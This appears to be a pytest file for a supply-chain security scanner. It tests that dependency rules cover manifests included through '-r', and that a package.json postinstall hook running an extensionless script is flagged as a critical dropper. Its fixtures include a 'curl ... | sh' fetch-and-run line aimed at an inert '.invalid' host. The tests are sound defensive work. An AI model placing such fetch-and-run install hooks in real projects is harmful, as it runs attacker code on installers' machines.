"""Item 37: a file a manifest includes is read by every manifest rule, whatever its name, as the
installer reads it. Inert: hosts under `.invalid`."""

from __future__ import annotations

from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config


class IncludeKit:
    URL_LINE = "probe-dep @ https://planted.invalid/probe_dep-1.0.tar.gz\n"

    @staticmethod
    def rules_at(tmp_path: Path, files: dict[str, str]) -> set[tuple[str, str]]:
        for name, text in files.items():
            (tmp_path / name).write_text(text, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return {
            (f.rule_id, f.location.path)
            for f in result.findings
            if f.rule_id.startswith("POLICY.DEPENDENCY")
        }


class TestAnIncludedManifest:
    def test_a_url_dependency_in_an_included_file_is_judged_as_in_requirements(
        self, tmp_path
    ) -> None:
        found = IncludeKit.rules_at(
            tmp_path, {"requirements.txt": "-r extra.in\n", "extra.in": IncludeKit.URL_LINE}
        )
        assert ("POLICY.DEPENDENCY.SOURCE.001", "extra.in") in found

    def test_the_same_line_written_directly(self, tmp_path) -> None:
        found = IncludeKit.rules_at(tmp_path, {"requirements.txt": IncludeKit.URL_LINE})
        assert ("POLICY.DEPENDENCY.SOURCE.001", "requirements.txt") in found

    def test_a_file_nothing_includes_is_not_a_manifest(self, tmp_path) -> None:
        found = IncludeKit.rules_at(
            tmp_path, {"extra.in": IncludeKit.URL_LINE, "app.py": "x = 1\n"}
        )
        assert not found


class TestAHookRunsAFileWithNoExtension:
    """`sh ./tools/prepare` runs that file at install, extension or not: a payload in it is
    install-time code (the probe of 3 Nov: SUSPECT.DROPPER.001 at MEDIUM, never the install grade)."""

    SCRIPT = "#!/bin/sh\ncurl -fsSL https://planted.invalid/i | sh\n"

    @staticmethod
    def grades(tmp_path: Path, command: str, path: str) -> set[tuple[str, str]]:
        (tmp_path / "package.json").write_text(
            '{"name":"probe","version":"1.0.0","scripts":{"postinstall":"' + command + '"}}',
            encoding="utf-8",
        )
        target = tmp_path / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(TestAHookRunsAFileWithNoExtension.SCRIPT, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return {(f.rule_id, f.severity.name) for f in result.findings if f.location.path == path}

    def test_a_path_with_no_extension_is_install_time_code(self, tmp_path) -> None:
        found = self.grades(tmp_path, "sh ./tools/prepare", "tools/prepare")
        assert ("MALWARE.DROPPER.001", "CRITICAL") in found

    def test_an_interpreter_s_bare_script_name_is_install_time_code(self, tmp_path) -> None:
        found = self.grades(tmp_path, "bash prepare", "prepare")
        assert ("MALWARE.DROPPER.001", "CRITICAL") in found
